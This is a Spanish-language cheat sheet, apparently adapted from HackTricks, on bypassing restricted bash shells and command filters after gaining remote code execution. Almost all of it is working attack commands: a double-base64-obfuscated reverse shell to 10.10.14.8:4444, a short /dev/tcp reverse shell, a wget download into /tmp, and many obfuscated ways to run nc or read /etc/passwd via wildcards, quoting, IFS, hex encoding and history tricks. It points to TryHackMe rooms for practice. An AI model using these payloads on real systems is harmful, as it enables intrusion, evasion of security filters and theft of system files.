---
title: Bypass Bash Restrictions
published: true
---

# BYPASS BASH RESTRICTIONS

## Table of contents

- [BYPASS BASH RESTRICTIONS](#bypass-bash-restrictions)
  - [INTRODUCCION](#introduccion)
  - [TRUCOS REVERSE SHELL](#trucos-reverse-shell)
    - [PROBAR CON RUTA ABSOLUTA](#probar-con-ruta-absoluta)
    - [DOBLE BASE64](#doble-base64)
    - [SHORT REVERSE SHELL](#short-reverse-shell)
  - [TRUCOS PALABRSA PROHIBIDAS Y BYPASS PATHS](#trucos-palabrsa-prohibidas-y-bypass-paths)
    - [SUSTITUIR UN CARACTER CON SIGNO DE INTERROGACION]
    (#sustituir-un-caracter-con-signo-de-interrogacion)
    - [SUSTITUIR UN CARACTER CON COMODIN](#sustituir-un-caracter-con-comodin)
    - [SUSTITUIR UN CARACTER ENCERRANDOLO ENTRE CORCHETES](#sustituir-un-caracter-encerrandolo-entre-corchetes)
    - [COMILLAS PARA CONCATENACIONES](#comillas-para-concatenaciones)
    - [EJECUCION A TRAVES DEL $0](#ejecucion-a-traves-del-0)
    - [BYPASS MEDIANTE VARIABLES NO INICIALIZADAS](#bypass-mediante-variables-no-inicializadas)
    - [BYPASS USANDO FALSOS COMANDOS](#bypass-usando-falsos-comandos)
    - [BYPASS MEDIANTE CONCATENACION USANDO EL HISORIAL](#bypass-mediante-concatenacion-usando-el-hisorial)
  - [BYPASS ESPACIOS PROHIBIDOS](#bypass-espacios-prohibidos)
  - [BYPASS SLASH Y BACKSLASH](#bypass-slash-y-backslash)
  - [BYPASS CON CODIFICACION EN HEXADECIMAL](#bypass-con-codificacion-en-hexadecimal)
  - [BYPASS DE IP](#bypass-de-ip)

## INTRODUCCION

Puede suceder que tenemos un RCE o una reverse shell pero nos bloquea ciertos comandos o caracteres, esto es posible evadir jugando con algunos trucos.

## TRUCOS REVERSE SHELL

### PROBAR CON RUTA ABSOLUTA

```bash
/bin/ls
```

[https://tryhackme.com/room/chillhack](https://tryhackme.com/room/chillhack)

### DOBLE BASE64

```bash
# Double-Base64 es una gran manera de evitar bad charecters como +, funciona el 99% del tiempo
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
#echo\WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

### SHORT REVERSE SHELL

```bash
#invocar la reverse shell
(sh)0>/dev/tcp/10.10.10.10/443
#luego colocar esto para tener una salida
exec >&0
```

## TRUCOS PALABRSA PROHIBIDAS Y BYPASS PATHS

### SUSTITUIR UN CARACTER CON SIGNO DE INTERROGACION

```bash
/usr/bin/p?ng #/usr/bin/ping
nma? -p 80 localhost #/usr/bin/nmap -p 80 localhost
```

### SUSTITUIR UN CARACTER CON COMODIN

```bash
/usr/bin/who*mi # /usr/bin/whoami
```

### SUSTITUIR UN CARACTER ENCERRANDOLO ENTRE CORCHETES

```bash
# [chars]

/usr/bin/n[c] # /usr/bin/nc
```

### COMILLAS PARA CONCATENACIONES

```bash
# Quotes / Concatenation

'p'i'n'g # ping

"w"h"o"a"m"i # whoami

\u\n\a\m\e \-\a # uname -a

ech''o test # echo test

ech""o test # echo test

bas''e64 # base64

/\b\i\n/////s\h
```

### EJECUCION A TRAVES DEL $0

En $0 se encuentra el tipo de shell que utiliza el sistema por defecto, puede ser **sh, bash, zsh, etc**

```bash
echo whoami|$0
```

### BYPASS MEDIANTE VARIABLES NO INICIALIZADAS

```bash
# Variables no inicializadas: Una variable no inicializada es igual a nulo (nada)

cat$u /etc$u/passwd$u  # cat /etc/passwd

p${u}i${u}n${u}g #ping
```

### BYPASS USANDO FALSOS COMANDOS

entre caracter y caracter del comando que queremos ejecutar podemos colocar un comando erroneo, dependiendo de cuantos errores pongamos nos saldran la misma cantidad de errores y al final el resultado del comando

```bash
p$(u)i$(u)n$(u)g # ping

w`u`h`u`o`u`a`u`m`u`i #whoami

# w`u`h`u`o`u`a`u`m`u`i
zsh: command not found: u
zsh: command not found: u
zsh: command not found: u
zsh: command not found: u
zsh: command not found: u
root

```

### BYPASS MEDIANTE CONCATENACION USANDO EL HISORIAL

```bash
# Concatenación de cadenas usando el historial

# !-1 Se sustituirá por el último comando ejecutado, y !-2 por el penúltimo comando

mi # Esto arrojará un error (PENULTIMO)

whoa # Esto arrojará un error (ULTIMO)

!-1!-2 # Esto ejecutará whoami
```

## BYPASS ESPACIOS PROHIBIDOS

Estos trucos en caso de que los espacios entre comandos esten prohibidos:

```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test
```

```bash
## IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice

#  Other way, just change each space for ${IFS}
echo${IFS}test
```

```bash
# Using hex format
X=$'cat\x20/etc/passwd'&&$X
```

```bash
# New lines
p\
i\
n\
g # These 4 lines will equal to ping
```

```bash
## Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```

## BYPASS SLASH Y BACKSLASH

Trucos en casod e que esten prohibidos los slash y backslash:

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

```bash
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

## BYPASS CON CODIFICACION EN HEXADECIMAL

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

## BYPASS DE IP

```bash
# Decimal IPs
127.0.0.1 == 2130706433

ping -c 1 2130706433
```

PRACTICAR:

- PICKLE RICK - THM

FUENTE:

- [https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions)